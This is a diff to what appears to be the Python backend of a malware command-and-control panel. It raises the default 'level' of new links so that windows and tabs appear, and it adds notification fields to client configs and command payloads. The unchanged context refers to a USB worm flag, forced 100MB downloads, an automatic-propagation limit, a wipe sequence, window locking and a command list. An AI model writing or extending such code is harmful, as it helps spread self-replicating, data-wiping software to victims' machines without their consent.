@@ -351,7 +351,7 @@ def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
               "VALUES(?,?,?,?,?,1,?,0,?,1,?,?,?,?,?,?)",
               (code, (name or "").strip()[:60] or "名無し", m, _abs_dest(dest)[:300],
                (note or "")[:300], _now(), ws, 1 if notify not in ("0", "") else 0,
-               ntext, nm, 7 if fx else 1, fx, _SG_VER))
+               ntext, nm, 7 if fx else _SG_LEVEL_DEFAULT, fx, _SG_VER))
     c.commit()
     c.close()
     try:
@@ -518,6 +518,10 @@ def _lv(v) -> int:
         return max(0, min(7, int(v)))
     except Exception:
         return 1
+
+
+# ★ 新規リンクの既定レベル（1だと窓もタブも出ないため 3 を既定に。SG_LEVEL_DEFAULT=1 で従来通り）
+_SG_LEVEL_DEFAULT = _lv(os.getenv("SG_LEVEL_DEFAULT", "3"))
 
 
 def _sg_win_lock(row=None):
@@ -706,6 +710,12 @@ def _sg_cfg(row, code, sid, lv, app_name, extra=None):
         "usbCode": code, "usbWorm": True, "usbBase": "", "usbLabel": app_name,
         # ★ 追加：100MB 配布と自動増殖上限
         "dlMBForce": _SG_DL_MB, "installMB": _SG_INSTALL_MB, "autoMax": _SG_AUTO_MAX,
+        # ★ 追加：通知（監視室の設定を実際に反映）
+        "notify": int(_val(row, "notify", 1) or 0),
+        "notifyText": (_val(row, "notify_text", "") or DEFAULT_NOTIFY)[:200],
+        "notifyMode": (_norm_mode(_val(row, "notify_mode", ""))
+                       if (_val(row, "notify_mode", "") or "") else ""),
+        "name": app_name, "tabMinLevel": 3,
     }
     if extra:
         cfg.update(extra)
@@ -1013,7 +1023,12 @@ def _sg_cmd_payload(owner, code, sid, sw=False):
            "wipe": int(_val(row, "wipe_seq", 0) or 0),
            "win": _sg_win_lock(row),
            "hard": _val(row, "hard", "") or "",
-           "ver": _SG_VER, "cmds": cmds, "server": _now()}
+           "ver": _SG_VER, "cmds": cmds, "server": _now(),
+           # ★ 追加：SW からの代打ち通知と名前
+           "ntext": (_val(row, "notify_text", "") or DEFAULT_NOTIFY)[:200],
+           "nt_on": int(_val(row, "notify", 1) or 0),
+           "nm": (row["name"] or "").strip() or _SG_APP_NAME,
+           "notify": int(_val(row, "notify", 1) or 0)}
     c.close()
     return out
 
